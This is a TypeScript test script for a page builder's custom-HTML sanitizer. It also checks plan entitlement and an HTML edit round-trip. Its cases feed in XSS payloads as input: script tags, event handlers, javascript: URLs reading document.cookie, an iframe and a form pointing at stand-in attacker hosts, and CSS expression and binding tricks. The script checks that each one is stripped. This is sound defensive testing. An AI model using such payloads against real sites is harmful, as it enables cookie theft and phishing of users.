/**
 * Stage 4: before/after sanitizer checks against the real module.
 * Run: pnpm exec tsx scripts/stage4-sanitize-check.ts
 */
import {
  createBlock,
  documentHasCustomHtml,
  documentToEditableHtml,
  parseHtmlDocument,
  sanitizeCustomHtml,
  type PageDocument,
} from "../src/index.ts";
import { canUseCustomHtml } from "../../plans/src/index.ts";

function assertCustomHtmlEntitlement(
  document: PageDocument,
  planId: string,
): { ok: true } | { ok: false; error: "custom_html_requires_cumulus" } {
  if (documentHasCustomHtml(document) && !canUseCustomHtml(planId)) {
    return { ok: false, error: "custom_html_requires_cumulus" };
  }
  return { ok: true };
}

type Case = {
  name: string;
  input: string;
  mustContain?: string[];
  mustNotContain?: string[];
};

const cases: Case[] = [
  {
    name: "1. script tag",
    input: `<div>Hello<script>alert(1)</script><p>World</p></div>`,
    mustNotContain: ["<script", "alert(1)"],
    mustContain: ["Hello", "World"],
  },
  {
    name: "2. inline event handlers",
    input: `<img src="https://example.com/x.png" onerror="alert(1)"><button onclick="steal()">Click</button><div onmouseover="x()">hover</div>`,
    mustNotContain: ["onerror", "onclick", "onmouseover", "alert(1)", "steal()", "x()"],
  },
  {
    name: "3. javascript: URL in href",
    input: `<a href="javascript:alert(document.cookie)">click</a><a href="JAVASCRIPT:void(0)">upper</a><a href="https://example.com">ok</a>`,
    mustNotContain: ["javascript:", "JAVASCRIPT:"],
    mustContain: ['href="https://example.com"'],
  },
  {
    name: "4. external iframe",
    input: `<p>Before</p><iframe src="https://evil.example/phish"></iframe><iframe src="https://www.youtube.com/embed/abc"></iframe><p>After</p>`,
    mustNotContain: ["<iframe", "evil.example", "youtube.com/embed"],
    mustContain: ["Before", "After"],
  },
  {
    name: "5. form posting to third party",
    input: `<form action="https://attacker.example/collect" method="POST"><input name="email"><button type="submit">Send</button></form><p>Keep me</p>`,
    mustNotContain: ["<form", "attacker.example", "<input", "<button"],
    mustContain: ["Keep me"],
  },
  {
    name: "6. dangerous CSS",
    input: `<div style="width:expression(alert(1)); color:red; -moz-binding:url(http://evil/x.xml#xss); background:url(javascript:alert(2))">styled</div><style>body{color:blue} @import url(evil.css); .x{behavior:url(htc); background:url(javascript:alert(3))}</style>`,
    mustNotContain: [
      "expression(",
      "-moz-binding",
      "url(javascript:",
      "@import",
      "behavior:",
      "alert(1)",
      "alert(2)",
      "alert(3)",
      "evil.css",
      "evil/x",
    ],
    mustContain: ["color:red", "color:blue", "styled"],
  },
  {
    name: "7. legitimate HTML/CSS",
    input: `<div class="hero" style="color:#0d9488; padding:1.5rem; max-width:40rem; display:flex; gap:1rem; align-items:center"><h2 style="margin:0; font-size:1.5rem">Welcome</h2><p style="margin:0; line-height:1.5">A short layout with spacing and color.</p></div><style>.hero p { letter-spacing: -0.01em; }</style>`,
    mustContain: [
      'class="hero"',
      "color:#0d9488",
      "padding:1.5rem",
      "display:flex",
      "Welcome",
      "letter-spacing",
      "<style>",
    ],
  },
];

let failed = 0;
for (const c of cases) {
  const out = sanitizeCustomHtml(c.input);
  console.log(`===== ${c.name} =====`);
  console.log("INPUT:");
  console.log(c.input);
  console.log("OUTPUT:");
  console.log(out || "(empty)");
  const missing = (c.mustContain || []).filter((s) => !out.includes(s));
  const leaked = (c.mustNotContain || []).filter((s) =>
    out.toLowerCase().includes(s.toLowerCase()),
  );
  if (missing.length || leaked.length) {
    failed += 1;
    console.log("CHECK: FAIL");
    if (missing.length) console.log("  missing:", missing.join(", "));
    if (leaked.length) console.log("  leaked:", leaked.join(", "));
  } else {
    console.log("CHECK: OK");
  }
  console.log("");
}

const freeDoc: PageDocument = {
  version: 1,
  blocks: [{ id: "1", type: "html", html: "<p>x</p>" }],
};
console.log("===== API entitlement (server helper) =====");
console.log(
  "free + html block:",
  assertCustomHtmlEntitlement(freeDoc, "free"),
);
console.log("pro  + html block:", assertCustomHtmlEntitlement(freeDoc, "pro"));
console.log(
  "free + paragraph:",
  assertCustomHtmlEntitlement(
    { version: 1, blocks: [{ id: "1", type: "paragraph", text: "hi" }] },
    "free",
  ),
);

console.log("===== HTML mode round-trip (custom html) =====");
{
  const block = createBlock("html");
  if (block.type !== "html") throw new Error("createBlock html failed");
  block.html = `<div class="hero" style="color:#0d9488"><p>Round trip</p></div>`;
  const doc: PageDocument = { version: 1, blocks: [block] };
  const editable = documentToEditableHtml(doc);
  const parsed = parseHtmlDocument(editable);
  if (!parsed.ok) {
    failed += 1;
    console.log("CHECK: FAIL parse", parsed.error);
  } else {
    const htmlBlocks = parsed.document.blocks.filter((b) => b.type === "html");
    const ok =
      htmlBlocks.length === 1 &&
      htmlBlocks[0]!.type === "html" &&
      htmlBlocks[0]!.html.includes("Round trip") &&
      htmlBlocks[0]!.html.includes("hero");
    console.log("EDITABLE:");
    console.log(editable);
    console.log("PARSED html:", htmlBlocks[0] && htmlBlocks[0].type === "html" ? htmlBlocks[0].html : "(none)");
    if (!ok) {
      failed += 1;
      console.log("CHECK: FAIL");
    } else {
      console.log("CHECK: OK");
    }
  }
  console.log("");
}

if (failed) {
  console.error(`\n${failed} case(s) failed`);
  process.exit(1);
}
console.log("\nAll sanitizer cases passed.");
